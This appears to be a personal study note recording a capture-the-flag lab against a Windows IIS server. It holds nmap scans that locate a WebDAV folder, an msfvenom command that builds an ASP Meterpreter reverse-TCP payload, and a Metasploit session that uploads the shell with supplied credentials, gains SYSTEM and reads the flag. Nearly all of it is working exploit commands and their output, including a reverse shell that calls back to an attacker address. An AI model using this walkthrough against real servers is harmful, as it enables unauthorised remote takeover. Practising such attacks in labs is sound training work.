---
up: "[[Exploiting Windows Vulnerabilities]]"
---

# ðŸ§ª Windows ISS Server - WebDAV Metasploit

```bash
# nmap 10.4.16.53
Starting Nmap 7.91 ( https://nmap.org ) at 2024-02-04 23:34 IST
Nmap scan report for 10.4.16.53
Host is up (0.0093s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
```

```bash
# nmap -sV 10.4.16.53
Starting Nmap 7.91 ( https://nmap.org ) at 2024-02-04 23:34 IST
Nmap scan report for 10.4.16.53
Host is up (0.0095s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds
```

```bash
# nmap -sV -p 80 --script http-enum 10.4.16.53
Starting Nmap 7.91 ( https://nmap.org ) at 2024-02-04 23:35 IST
Nmap scan report for 10.4.16.53
Host is up (0.0094s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.37 seconds
```

```bash
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.4.8 LPORT=1234 -f asp > shell.asp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38579 bytes
```

```bash
$ msfconsole -q
msf6> use exploit/windows/iis/iis_webdav_upload_asp
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpPassword password_123321
HttpPassword => password_123321
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set PATH /webdav/shell.asp
PATH => /webdav/shell.asp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOSTS 10.4.16.53
RHOSTS => 10.4.16.53
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run 

[*] Started reverse TCP handler on 10.10.4.8:4444 
[*] Checking /webdav/shell.asp
[*] Uploading 610861 bytes to /webdav/shell.txt...
[*] Moving /webdav/shell.txt to /webdav/shell.asp...
[*] Executing /webdav/shell.asp...
[*] Deleting /webdav/shell.asp (this doesnt always work)...
[*] Sending stage (175174 bytes) to 10.4.16.53
[*] Meterpreter session 1 opened (10.10.4.8:4444 -> 10.4.16.53:49831) at 2024-02-04 23:48:08 +0530

meterpreter > sysinfo
Computer        : AD-IIS
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > dir C:
Listing: C:
===========

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2018-09-15 12:49:00 +0530  $Recycle.Bin
100666/rw-rw-rw-  32      fil   2021-01-04 12:52:29 +0530  flag.txt

meterpreter > cat C:/flag.txt
d3aff16a801b4b7d36b4da1094bee345
```

Flag is `d3aff16a801b4b7d36b4da1094bee345`
